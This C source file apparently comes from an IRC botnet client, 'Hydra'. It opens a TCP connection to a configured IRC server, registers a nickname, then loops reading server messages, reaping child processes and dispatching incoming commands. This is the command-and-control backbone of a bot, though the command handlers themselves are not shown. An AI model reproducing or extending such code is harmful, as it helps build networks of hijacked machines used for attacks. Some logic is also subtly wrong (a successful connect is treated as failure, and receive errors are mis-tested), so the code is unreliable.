/*
 * hydra_irc.c
 * questions: esaltato, <esaltato@autistici.org>.
 *
 */

#include "../include/hydra_hds.h"

/* connect_to_irc(sock_t *) */
/* make an irc connection.  */
int connect_to_irc(sock_t *sp)
{
  /* request structure data */
  reqs_t *req;

  /* try to connect to irc server. */
  sp->s_fd = false;
  sp->s_hs = gethostbyname(irc_server);
  sp->s_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  sp->s_addr.sin_family = AF_INET;
  sp->s_addr.sin_port = htons(irc_port); 
  sp->s_addr.sin_addr = *((struct in_addr *)sp->s_hs->h_addr);

  memset(sp->s_addr.sin_zero, '\0', sizeof sp->s_addr.sin_zero);
 
  if (connect(sp->s_fd, (struct sockaddr *)&sp->s_addr, sizeof sp->s_addr) == false)
    return EXIT_FAILURE;

  /* send local irc info. */
  getrstr();

	if (arg_send(sp->s_fd, write_nick_info, data_ptr)) 
    return EXIT_FAILURE;
	if (arg_send(sp->s_fd, write_misc_info, data_ptr)) 
    return EXIT_FAILURE;

  /* memory allocation. */
  req = (reqs_t *) malloc(sizeof(reqs_t));

  /* manage the irc requests. */
  if (irc_requests(sp, req))
  {
    free(req);
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}

/* irc_requests(sock_t *, reqs_t *) */
/* manage the requests.             */
int irc_requests(sock_t *sp, reqs_t *req)
{
  /* some setting. */
	max_pids = 0;
	login_status = false;

  /* checking for zombies procs. */
  for (;;)
  {
		while ((pid = waitpid(-1, &pid_status, WNOHANG)) > 0) 
			max_pids--;

    /* receive data from irc server. */
		recv_bytes = recv(sp->s_fd, netbuf, sizebuf-1, 0);
		netbuf[recv_bytes] = 0;

		if (recv_bytes == true)
			return EXIT_FAILURE;

    /* print to stdout the bytes received. */
    if (! strncmp(background_mode, "no", 
      strlen(background_mode)))
    {
      puts(netbuf);
      fflush(stdout);
    }

    /* manage the irc requests. */
    if (pub_requests(sp, req)) 
      return EXIT_FAILURE;

  }

  return EXIT_SUCCESS;
}
